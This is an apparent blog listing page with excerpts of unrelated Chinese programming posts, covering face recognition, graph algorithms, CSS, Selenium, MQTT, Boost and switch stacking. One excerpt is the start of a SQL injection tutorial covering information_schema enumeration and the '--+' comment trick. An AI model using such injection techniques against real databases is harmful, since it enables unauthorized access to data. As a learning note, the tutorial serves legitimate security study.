</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c81a1f12d84e017f273d9063f449c924/" rel="bookmark">
			人脸识别 宿舍门禁系统(python qt opencv带数据库)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		制作过程 最新更新 其他版本基于retinaface,卷神经网络余弦相似度人脸匹配本文章版本预览点击下载源代码视频效果 一.界面设计 使用Qt Designer（源代码内有设计文件ui):二.人脸检测模块 opencv-dnn三.人脸识别模块 LBPHFaceRecognizer四.数据库 sqlite 最新更新 其他版本基于retinaface,卷神经网络余弦相似度人脸匹配 文章：
retinaface+arcfae实现的人脸系统 人脸考勤 人脸打卡 宿舍管理 人脸信息管理系统
不同版本打包程序：
人脸识别信息系统+数据库+ui设计+全代码
人脸识别+活体检测+信息查询.
人脸识别 人脸眼镜贴图 人脸跟踪
神经网络人脸考勤系统，信息录入，考勤
人脸识别 学生信息登记系统 pyqt5 opencv sql
qq群686070107
本文章版本预览 点击下载源代码 视频效果 人脸识别 宿舍门禁系统( pyqt opencv带数据库）
一.界面设计 使用Qt Designer（源代码内有设计文件ui): 二.人脸检测模块 opencv-dnn OpenCV在DNN模块中提供了基于残差SSD网络训练的人脸检测模型，该模型分别提供了tensorflow版本，caffe版本，torch版本模型文件。
其中tensorflow版本的模型做了更加进一步的压缩优化，大小只有2MB左右，非常适合移植到移动端使用，实现人脸检测功能，而caffe版本的是fp16的浮点数模型，精准度更好。
对比传统人脸检测，同样一张图像，在OpenCV HAAR与LBP级联检测器中必须通过不断调整参数才可以检测出全部人脸，而通过使用该模型，基本在Python语言中基于OpenCV后台的推断，在25毫秒均可以检测出结果，网络支持输入size大小为300x300。
def getface(img,net): # 置信度参数，高于此数才认为是人脸，可调 confidence = 0.3 (h, w) = img.shape[:2] # 获取图像的高和宽，用于画图 blob = cv2.dnn.blobFromImage(cv2.resize(img, (300, 300)), 1.0,(300, 300), (104.0, 177.0, 123.0)) # blobFromImage待研究 net.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c81a1f12d84e017f273d9063f449c924/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96072bdfa0c7c9694b4f846215a576b0/" rel="bookmark">
			泛微OA e9版本实现请假开始时间必须小于请假结束时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、需求分析及示例2、完整代码3、使用到的接口/事件/方法3.1 WfForm.convertFieldNameToId3.2 WfForm.bindFieldChangeEvent3.3 Date.parse(dateString)3.4 WfForm.changeFieldValue 1、需求分析及示例 要求设计一个请假申请流程，其中 请假开始时间 和 请假结束时间 两个字段为浏览按钮-时间类型，当请假开始时间大于请假结束时间时，需要显示错误提示信息：“开始时间必须小于结束时间！”
2、完整代码 思路：先取得请假开始时间和请假结束时间的字段ID，然后作为参数调用表单字段值变化触发事件，当请假开始时间大于请假结束时间时，提示错误。
// 字段名	数据库字段名称	字段id // 请假开始时间	qjks	field111 // 请假结束时间	qjjssj	field222 方法一：使用字段id &lt;script&gt; //开始时间小于结束时间 var field111 = WfForm.convertFieldNameToId("field111");	//请假开始时间 var field222 = WfForm.convertFieldNameToId("field222");	//请假结束时间 //下面的写法也可以： //var field111 = WfForm.convertFieldNameToId("请假开始时间");	//var field222 = WfForm.convertFieldNameToId("请假结束时间"); // 表单字段值变化触发事件——字段值变化即会触发所绑定的函数，可多次绑定 WfForm.bindFieldChangeEvent("field111,field222", function (obj, id, value) { var value1 = WfForm.getFieldValue("field111"); var value2 = WfForm.getFieldValue("field222"); if (Date.parse(value1) &gt; Date.parse(value2)) { alert("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96072bdfa0c7c9694b4f846215a576b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb24d2b5feeb5c1497c2e7a1b1fa9b09/" rel="bookmark">
			搜索——BFS(广度优先搜索)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		BFS算法 BFS算法框架 BFS算法是利用队列实现的一种搜索算法。逐层向下遍历，从一个点像四周扩散（将可选节点存放于队列中，删除已被使用的节点），使用队列完成操作，通常用于最短路径的寻找。
BFS以树的层次一层一层查找。
BFS与DFS区别
BFS实质上就是一幅「图」，让你从一个起点，走到终点，问最短路径。这就是 BFS 的本质，框架搞清楚了直接默写就好。
记住下面这个框架就 OK 了：
// 计算从起点 start 到终点 target 的最近距离 int BFS(Node start, Node target) { Queue&lt;Node&gt; q; // 核心数据结构 Set&lt;Node&gt; visited; // 避免走回头路 q.offer(start); // 将起点加入队列 visited.add(start); int step = 0; // 记录扩散的步数 while (q not empty) { int sz = q.size(); /* 将当前队列中的所有节点向四周扩散 */ for (int i = 0; i &lt; sz; i++) { Node cur = q.poll(); /* 划重点：这里判断是否到达终点 */ if (cur is target) return step; /* 将 cur 的相邻节点加入队列 */ for (Node x : cur.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb24d2b5feeb5c1497c2e7a1b1fa9b09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/104e029a7a2bf0375c4290c330c273a3/" rel="bookmark">
			游戏引擎开发总结：节点编辑器实现思路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个思路是我直接想出来的，可能并不是主流的框架；
首先，我们先要设定几个原则，这样才能不让自己的思维天马行空 1：节点的输出口的输入是一个函数指针，用std::function封装
2：节点之间的数据交流只能是通过函数指针，节点不应该感知到link对面节点的存在
节点口的种类 1：输入节点口，接收数据的节点
2：输出节点口，输出数据的节点
大部分节点既有输入节点口也是输出节点口，区别的方法是连接线的时候，哪个节点是输入数据的节点，哪个是输出数据的节点，输出节点口的节点为输出节点，相反是输入节点
首先，我们可以确定节点的一些公共函数： 1：第一个很显然是OnUpData函数
2：第二个是OnLink函数，这个函数是在当链接了一条线的时候通知输入节点，但不通知输出节点
然后就是怎么判断输出节点口和输入节点口的的数据类型是否相同 这个我刚开始的思路是用模板来解决，但考虑到序列化和复杂度以及debug的难度，我放弃了，转而选择用string去存储类型信息，这个时候，有了以下几个好处
1：拥有运行时改变接口返回类型的能力
2：函数指针本身的类型变得无关紧要[我们可以根据判断字符串来安全地进行static_cast]
那么一个输出口的定义就如下了
struct FunSign{ void* ptr; std::vector&lt;std::string&gt; sign; } 大概的约定有了，那么接下来就一些设计上的问题了
这边我用的是ecs系统，用标识的方法来对节点进行不同操作，这样就不用更新的时候将所有的节点都遍历一遍了，而且这种组件的思维也有助于降低程序的复杂度
那么就来谈不同的操作怎么实现了：
节点定义 所有节点都继承至一个类Access，所有的节点都没BP_Node持有，节点相对于BP_Node称之为define。
Access定义了一些必要的虚函数，，BP_Node是一个适配器，将具体节点与编辑程序隔离开，让编辑程序以统一的方式对待所有节点；
创建节点 我选择的第三方库是ImGuiNodeEditor，ecs用的是entt库
这个的话，先创建一个实体，然后获得的enttityid作为节点的NodeID，将其作为key键，BP_Node*作为value，这样的话我们就能拥有enttity-&gt;BP_Node的映射了，这样就方便我们用ecs系统来遍历了，期间我们可以对结点推荐不同的define
节点的连接 这个就比较简单，我们只需要进行必要的安全判断，然后将需要的参数，比如输出节点的指针传送给输入节点即可，这边的话主要是逻辑问题
节点的断开 同上，通知输入节点，然后更新节点；
这边有意思的是，我将输入节点定义为一个二级指针，而且我们在BP_Node中存储每个节点的输出函数的一级指针，这样的好处是，我们判定一个节点的输出节点不可用时，只需要将BP_Node中的节点改变为nullptr，那么指向该指针的输入口指针就可以判断指向的内容是否为空，以便做出正确的判断，以防未定义行为；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6cedcd4bcce6047c3089039006c7b212/" rel="bookmark">
			#{}与${}区别及#{}为什么可以防止 SQL 注入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#{}和${}的区别是什么？
#{}是预编译处理，KaTeX parse error: Expected 'EOF', got '#' at position 22: …替换。 Mybatis 在处理#̲{}时，会将 sql 中的#{…{}时，就是把${}替换成变量的值。
使用#{}可以有效的防止 SQL 注入，提高系统安全性。
#{}防止 SQL 注入原理：
MyBatis的#{}之所以能够预防SQL注入是因为底层使用了PreparedStatement类的setString()方法来设置参数，此方法会获取传递进来的参数的每个字符，然后进行循环对比，如果发现有敏感字符（如：单引号、双引号等），则会在前面加上一个’/'代表转义此符号，让其变为一个普通的字符串，不参与SQL语句的生成，达到防止SQL注入的效果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24f08941777aefe8d7e652218208d414/" rel="bookmark">
			Spfa算法总结(C/C&#43;&#43;)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一: Spfa算法分析二: 代码分析 一: Spfa算法分析 1. 问题介绍：
2. 问题分析：
当我们遇到单源最短路+边权为负值问题时这时候该如何处理呢？
其实我们现在就可以使用Floyd()算法了，我们可以从两个方面来理解这个算法.
第一个方面从Bellman_ford()算法来理解,Spfa算法其实就是对Bellman-ford算法的一个优化，因为Bellman_ford算法每次其实都是对所有边的一个松弛过程，但其实我们可以优化为只去松弛那些距离变小的点并将其放入队列当中继续松弛即可。
其实有一个更好理解的方式，Spfa算法其实就和Dijkstra算法类似，不过的是Dijkstra算法每次都可以确定一个最优解，而Spfa无法确定，所以Spfa可以就看作从一个点开始让整个图不断优化，可以优化就又从那个点开始继续优化直至优化到这个图内所有点都无法再去优化其他点(即所有点达到最优解)。
负环判断：先让所有点都进入队列(相当于引入一个虚拟点到所有点)，然后同时从所有点开始去走，同时记录走到当前点所经过得边数，当边数 &gt;= n结点数量的时候，我们就可以确认必定出现负环，因为经过了n个结点则代表一定经过了n + 1条边.
3. 算法细节对比：
a.相同点：算法格式和Dijkstra算法类似
b.不同点：
Dijkstra算法使用优先队列, Spfa使用一般队列即可。
Dijkstra算法每次选取出来的值即是最优解，其状态st[ ] 表示是否已经选取，且状态不可逆 false 变为 true 不可倒退。
Spfa算法因为可能此点会被其他点再次优化所以其 状态st[ ]表示的是是否进入队列当中，可能会再次出队列所以要同步更新st[ ] 状态。
4. 算法总结：
时间复杂度: 最优 O(m) ,最差退回bellman-ford O(n m)
处理问题: 单源最短路 + 权值为负
二: 代码分析 a.注意时刻保持st[ ]状态和点是否在队列当中一致
// 出队列 int u = q.front(); q.pop(); // 进队列 st[u] = false; q.push(j); st[j] = true; b.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24f08941777aefe8d7e652218208d414/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62c647133a917086550d81fedb0965c7/" rel="bookmark">
			css之媒体查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、媒体查询 问题：因为移动端的尺寸不同,但是，在移动端屏幕上显示的元素的大小是相同的
解决：元素的尺寸大小，要根据屏幕尺寸的大小发生变化
1.媒体类型
媒体类型（media types）描述设备的一般类别
all:适用于所有的设备print：适用于打印模式screen：主要用于屏幕speech：主要用于语音合成器 /* 浏览器模式 */ /* @media screen { .box { font-size: 30px; } } */ /* 打印模式 */ @media print { .box { font-size: 30px; } } 2.媒体特性
媒体特性描述了 user-agent输出设备 或是浏览器环境的具体特征
width:viewport的宽度height：viewport的高度aspect-ratio：viewport的宽高比orientation：viewport的旋转方向 &lt;style&gt; /* 最大值和最小值的屏幕 */ /* @media (min-width: 700px) { .box { width: 200px; height: 200px; background-color: skyblue; } } @media (max-width: 960px) { .box { width: 200px; height: 200px; background-color: skyblue; } } */ /* 旋转方向 portrait: 竖屏 landscape: 横屏 */ @media (orientation: portrait) { .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62c647133a917086550d81fedb0965c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01740448dee24ee0e24a3081dc95ea78/" rel="bookmark">
			算法设计与分析——淘汰赛冠军问题（Java）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【问题】假设有 个选手进行竞技淘汰赛，最后决出冠军的选手，请设计竞技淘汰比赛的过程。
【想法】竞技淘汰比赛最自然的想法是将所有选手分成两部分，每部分决出胜者后，让这两个胜者进行比赛，再决出最后的冠军，这属于分治法，显然满足如下递推式：
应用扩展递归技术求解这个递推式，得到 。
下面考虑采用减治法，开始时将所有选手分成 n/2 组，每组两个选手进行比赛，被淘汰者不参加以后的比赛，然后再将剩余选手分成 n/4 组，每组两个选手进行比赛，......直到剩余最后两个选手，进行一次比赛即可选出最后的冠军。下图（减治法求解淘汰赛冠军问题示例图）给出了一个减治技术解决淘汰赛冠军问题的过程示例（假设按照字符编码进行比较）。
【算法分析】设 n=2，则外层的 while 循环共执行 k 次，在每一次执行时，内层的 for 循环的执行次数分别是 n/2，n/4，…，1，而函数 Comp 可以在常数时间内完成，因此，算法的执行时间为：
【算法实现】设函数 Comp 模拟两位选手 mem1 和 mem2 的比赛，若 mem1 获胜则函数 Comp 返回 1，否则返回 0，并假定可以在常数时间内完成函数 Comp 的执行，简单起见，用字符表示选手，设字符数组 r[n] 存储 n 个选手，算法用JAVA语言描述如下：
public class Comp { public static void main(String[] args) { char[] r=new char[]{'A','F','G','B','E','H','C','D'}; char c=Game(r,8); System.out.println("最后的冠军是："+c); } static boolean Comp(char a, char b) { if(a&gt;b) return false; else return true; } static char Game(char[] r, int n) { int i = n; while (i &gt; 1) //比赛直到剩余1人即为冠军 { i = i/2; for (int j = 0; j &lt; i; j++) if (Comp(r[j+i], r[j])) //胜者存入r[j]中 r[j] = r[j+i]; } return r[0]; } } 运行结果如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01740448dee24ee0e24a3081dc95ea78/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0495814f0b1c56af6cae1efcbc118a85/" rel="bookmark">
			Selenium之下拉框操作详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：执行自动化测试过程中遇到下拉框，包含：单选、多选，如何定位到下拉框并选中某个选项？
1 下拉框的分类 select 标签
非 select 标签
2 Select 下拉列表处理 针对 select 标签的下拉列表，Selenium 提供了 Select 类进行操作：
from selenium.webdriver.support.select import Select
下面这种方式一样可以使用 Select，原理是 ui 中又去调用的 Select 类：
from selenium.webdriver.support.ui import Select
Select 方法列表 Select 单选 针对单选的下拉框，每次仅能选择一个选项，可以在不同的选项中切换。
如图：
代码：
from selenium.webdriver.support.select import Select # 打开Chrome浏览器 driver = webdriver.Chrome("../login/chromedriver.exe") # 浏览器访问本地html地址 driver.get("file:///D:/ac/select.html") # 根据select下拉框的id定位 select = driver.find_element_by_id("traffic") # 获取select的所有选项 options_list = Select(select).options # 循环把select所有选项读取出来 for option in options_list: print(option.text) # 打印每个选项的文本值 time.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0495814f0b1c56af6cae1efcbc118a85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b73f1a938a9c5a4eb3432a11c9be1208/" rel="bookmark">
			人工智能&#43;深度学习&#43;模型训练数据集&#43;安全带和挂钩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安全带和挂钩数据集，用于人工智能模型训练，含大约300张图像。注意：未标注。
数据样例：
受网络制约，数据集分为两部分，下载链接：第一部分 ｜ 第二部分
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd65c10eb600fa7fe9d01563452e3763/" rel="bookmark">
			静态IP上网中多台路由器中的端口映射问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		静态IP上网的网络系统中，子路由器的端口映射问题。
1、首先主路由器用静态IP上网，其他子路由器使用DHCP（动态获取）方式上网。
2、登录子路由器 查看子路由器的IP地址：
子路由器下的IP设置 ：
3、去父路由器高级设置-&gt;端口转发-&gt;范围转发规则列表-&gt;添加规则：添加转发端口和目标路由器ip：
完成后再去子路由器添加端口转发规则：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f9bd3495550eca9390720b2bc73849e/" rel="bookmark">
			Swin-Unet模型代码详解及改进思路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Swim-unet是针对水下图像分割任务提出的一种模型结构，其基于U-Net模型并加入了Swin Transformer模块，可以有效地解决水下图像分割中的光照不均匀、噪声干扰等问题。
Swim-unet模型代码详解 首先，在导入必要的库后，我们需要定义Swin Transformer模块中的一些函数和类：
import torch
from torch import nn
from einops.layers.torch import Rearrange
def window_partition(x, window_size):
"""
划分块函数
Args:
x: 输入张量
window_size: 划分窗口大小
Returns:
划分好的块
"""
# 根据窗口大小进行分组，同时保留原有维度信息
B, H, W, C = x.shape
# 取整, 获得行数和列数
# 对于不够整除的数据, 直接抛弃
col_windows = W // window_size
row_windows = H // window_size
# 分组
partitions = torch.zeros([B, row_windows*col_windows, window_size, window_size, C], dtype=x.dtype, device=x.device)
for i in range(row_windows):
for j in range(col_windows):
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f9bd3495550eca9390720b2bc73849e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a69dfb6faa4b25bf47122e13d960f584/" rel="bookmark">
			基于libcurl 实现web-uploader客户端 大文件分片，断点续传(curl-uploader)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux Arm嵌入式设备 l 基于libcurl 实现大文件分片上传，断点续传，秒传,分片大小可控，使用libcurl 实现web-upload linux c/c++版本 客户端(curl-uploader)。通过wireshark 抓包网页版客户端上传文件过程分析http post 流程，总结http 流程如下。
工程代码：
客户端curl-uploader: https://download.csdn.net/download/zhujinghao09/87431650
后台服务器： https://gitee.com/laminae_admin/webupload/
主要流程如下：
_check_url = base_url + "/upload/fileRecord//zone/upload/md5Check"; (MD5验证)
_upload_url = base_url + "/upload/fileRecord//zone/upload"; （上传分片）
_merge_url = base_url + "/upload/fileRecord//zone/upload/merge/"; （合并分片）
核心代码：
s1 文件MD5
/* 计算文件MD5，支持分片计算，指定计算大小 */ int Ufile::file_md5(std::string &amp;md5_value,int start,int end) { char buf[1024 * 16]; MD5_CTX md5Context; MD5_Init(&amp;md5Context); int k =0; int s = start; int e = end; md5_value.clear(); //_file.seekp(0, _file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a69dfb6faa4b25bf47122e13d960f584/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1bad5b144fb7af0360e32fd40f663d1/" rel="bookmark">
			我的docker随笔41：mqtt服务部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、引言 因工作需要，需部署 mqtt 服务器进行测试。
二、技术小结 dockerhub 上相关镜像，直接拉取可用。经查，eclipse-mosquitto有官方认证OFFICIAL，故使用之，版本为2.0.15。先启动容器，获取配置文件，并设置用户和密码，生成账户文件。修改配置，挂账户文件。使用客户端测试。 三、实践 下载 命令：
docker pull eclipse-mosquitto:2.0.15 获取配置 获取配置文件，创建密码：
docker run --rm -it -v /tmp/config:config/mqtt --rm --name mqtt eclipse-mosquitto:2.0.15 sh cd /tmp/config/ cp /mosquitto/config/mosquitto.conf . touch /tmp/config/latelee.conf mosquitto_passwd -b /tmp/config/latelee.conf latelee 123456 cat /tmp/config/latelee.conf latelee:$7$101$8uztnbWciNtQhAB+$ElyWv714QaN8E/DOt9wzN/fRs9MdXtmpuq1xJifPKVfno1meGzCp4UnkZErM3WbaZtWIL/tKaxq72dXJ8oRwKw== exit 如要创建多个用户，执行mosquitto_passwd -b /tmp/config/latelee.conf &lt;用户&gt; &lt;密码&gt;即可。
修改配置 重新编辑文件mosquitto.conf：
persistence true persistence_file mosquitto.db persistence_location /mosquitto/data log_dest file /mosquitto/log/mosquitto.log allow_anonymous false password_file /mosquitto/config/latelee.conf # 默认端口是 1883 port 1883 # 以下两行表示可以通过9001端口以websocket的方式连接mosquitto服务 #listener 9001 #protocol websockets docker-compose配置 docker-compose.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1bad5b144fb7af0360e32fd40f663d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e23b695ef62ea94055fe98494b61430/" rel="bookmark">
			boost.variant
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		boost::variant 一. Variant是什么？ Variant 类似于union, 我们知道union是C++从C中继承的遗产，不大好用，使用的也比较少，boost提供了一种新的结构类似于union， 每次只能保存以一种类型，在初始化的时候可以指定不同类型，简单的使用如下：
#include &lt;boost/variant.hpp&gt; #include &lt;string&gt; int main() { boost::variant&lt;double, char, std::string&gt; v; v = 3.14; v = 'A'; v = "Hello, world!"; } 简单理解就是这个variant可以承接其申明类型中的任意一个，而且表现对外时也只能是其中的某一个类型。感觉像是里面每个类型有一个开关，那个类型被赋值，variant就会表现为什么类型。上面的例子也可以用一个 union 类型来实现， 但是与 union 不同的是： boost::variant 可以储存像 std::string 这样的 class 类型的数据。
二. 使用 要获取variant中的值时,一定要知道当前类型,并由get操作进行获取相应的值,如果转型失败,会抛出bad_get异常。所以需要传入一个模板参数来指明你需要返回的数据类型。 若是指定了一个非法的类型， 你会遇到一个运行时而不是编译期的错误。
#include &lt;boost/variant.hpp&gt; #include &lt;string&gt; #include &lt;iostream&gt; int main() { boost::variant&lt;double, char, std::string&gt; v; v = 3.14; std::cout &lt;&lt; boost::get&lt;double&gt;(v) &lt;&lt; std::endl; v = 'A'; std::cout &lt;&lt; boost::get&lt;char&gt;(v) &lt;&lt; std::endl; v = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e23b695ef62ea94055fe98494b61430/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c55c4ac42c517baf368de35852b3e44e/" rel="bookmark">
			boost库介绍以及使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++ boost库介绍以及使用 一. 什么是boost库 ​ boost 库是一个优秀的，可移植的，开源的 C++ 库，它是由 C++ 标准委员会发起的，其中一些内容已经成为了下一代 C++ 标准库的内容，在 C++ 社区中影响甚大，是一个不折不扣的准标准库，它的功能十分强大，弥补了 C++ 很多功能函数处理上的不足。
​ 学习链接: https://theboostcpplibraries.com/
​ https://www.cnblogs.com/lidabo/p/9294874.html
​ https://tangxing.blog.csdn.net/article/details/116393985
二. 特点 ​ 可移植性：Windows，Linux，Unix 等
​ 开源免费：使用 Boost License 来授权使用，商业和非商业都是可以使用的
​ 高效：具有工业强度，设计结构良好，广泛使用
三. 分类 ​ boost 库功能强大，按照功能模块分类，大致可以分为如下：
字符串和文本处理库，容器库，迭代器库，算法库，函数对象和高阶编程库，泛型编程，模板元编程，预处理元编程，并发编程，数字和数学，排错和测试，数据结构，图像处理，输入输出，内存管理，跨语言混合编程，解析，编程接口等。
四.boost库安装 一. CentOS环境下搭建boost开发环境 安装boost库
# yum install boost # yum install boost-devel 二. 下载boost库及编译 ​ 要使用 C++ boost 库，先要下载 boost 库，下载地址是：https://www.boost.org/
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-0hDUehNp-1680489201384)(watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zODEwMjc3MQ==,size_16,color_FFFFFF,t_70.png)]
​ 选择 Downloads 下的 Current Release 就可以下载了。下载完成后查看目录，大致如下结构所示。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c55c4ac42c517baf368de35852b3e44e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d54802ec3c07272eacaecff9bac9eabf/" rel="bookmark">
			SQL注入基本教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注：只是自己学习记录，若有不对的地方请指出，文章有过一次修改，修改了关于order by函数的知识点
个人小站
SQL注入基本教程 数据库的结构注释符SQL注入简单教程 数据库的结构 学习SQL注入首先要知道数据库的结构
数据库由三个部分组成：数据库——表——列
在初始化安装MySQL数据库后有四个默认的库： information_schema mysql performance_schema test information_schema：
保存着数据库中所有数据库的信息，具体有数据库中有那些表，和表中的字段。
tables表，其中tales表中含有数据库中所有的表，有一个检索的功能：
•	table_schema列：存放着所有数据库的名字 •	table_name列：存放着所有数据库的表的名字 columns表中：
•	table_schema列：存放着所有数据库的名字 •	table_name列：存放着所有数据库的表名 •	column_name列：存放着所有数据库的列名 schemata表：
存放着所有数据库的名字
•	schema_name列：存放着所有数据库的的名字。只有数据库的名字 所以注入时常用information_schema
mysql：
这个是mysql的核心数据库，类似于sql server中的master表，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。
performance_schema：
mysql5.5 版本 新增了一个性能优化的引擎，performance_schema这个功能默认是关闭的。
test：
没有东西
基础的查询语句：
查询语句：select table_schema from information_schema.tables
数据库和表的连接用”.“
这条指令是查询information_schema数据库的tables表中查询table_schema表的值
查询语句：select group_concat(table_schema) from information_schema.tables
函数：group_concta(将相同的行组合起来)
执行语句：insert into information_schema.tables(id,name,password) values(9,zxt,toor)
添加东西到表里面
注释符 搭建好环境后可以开始做题了
先记录一个知识点注释符：–+和#和/**/的使用
在mysql中–和#代表的是注释符
mysql中单行注释#号，使用方法是注释符后直接加注释内容
而–则是要在后面加一个空格才能生效，实现注释的作用。
能看到这里的命令没有执行-- 后面的语句。
这也就是在做题中输入–
显示语法错误的原因，为什么要输入–+呢？因为+等于空格，所以在注入中才要输入–+
SQL注入简单教程 在做题前，先修改一下环境，在环境中加入：echo "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d54802ec3c07272eacaecff9bac9eabf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d735d960c8da740a7553b6dd331c1f45/" rel="bookmark">
			华三交换机irf堆叠以及BFD检测配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		堆叠也叫虚拟化，将两台交换机虚拟成一台交换机，两台交换机进行虚拟化后，备机上的配置会消失跟随主机的配置，所以最好是在做配置前，先将设备堆叠在做配置，当然也可以先在主机上进行配置，堆叠后备机会自动学习主机的配置。（模拟器上做堆叠使用6850，不要使用5820这个交换机做不了bfd检测）
环境：
两台交换机（一条线也可以做堆叠，配置命令一样，去掉一条线的命令就行）
bfd检测VLAN
配置irf堆叠 Switch-1： [H3C]sysname irf-1 修改名字
[irf-1]irf member 1 priority 10 修改irf优先级
[irf-1]interface Ten-GigabitEthernet 1/0/49
[irf-1-Ten-GigabitEthernet1/0/49]shutdown 关闭端口（不关闭是加入不了堆叠端口的）
[irf-1-Ten-GigabitEthernet1/0/49]quit
[irf-1]interface Ten-GigabitEthernet 1/0/50
[irf-1-Ten-GigabitEthernet1/0/50]shutdown
[irf-1-Ten-GigabitEthernet1/0/50]quit
以下两条命令可以批量管理端口
[irf-1]interface range Ten-GigabitEthernet 1/0/49 Ten-GigabitEthernet 1/0/50
[irf-1-if-range]shutdown
[irf-1]irf-port 1/2
[irf-1-irf-port1/2]port group interface Ten-GigabitEthernet 1/0/49 将端口加入堆叠组
[irf-1-irf-port1/2]port group interface Ten-GigabitEthernet 1/0/50
[irf-1-irf-port1/2]quit
[irf-1]interface range Ten-GigabitEthernet 1/0/49 Ten-GigabitEthernet 1/0/50
[irf-1-if-range]undo shutdown 加入堆叠组后将两个端口恢复正常
[irf-1-if-range]quit
[irf-1]quit
&lt;irf-1&gt;save 保存配置（或者使用save force，这个命令不用输入那些Y或者N）
&lt;irf-1&gt;system-view
[irf-1]irf-port-configuration active 将irf配置激活（！！！一定要先保存配置再激活）
Switch-2： [H3C]sysname irf-2
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d735d960c8da740a7553b6dd331c1f45/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/831d94e236c939aad0ed9f2dfcb5abbd/" rel="bookmark">
			.Net8运行在Arm64上的初体验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 .Net是可以运行在Arm上面的，但是有一定的限制。比如dotnet sdk在MacOS系统上不能运行Arm的32位程序。本篇来看下最新的.Net8 Preview2运行在Linux-Arm64位的系统上。
概括 运行如下命令
下载arm64的root系统和.Net8的arm64 SDK。解压，然后放到root tmp文件夹下面安装。
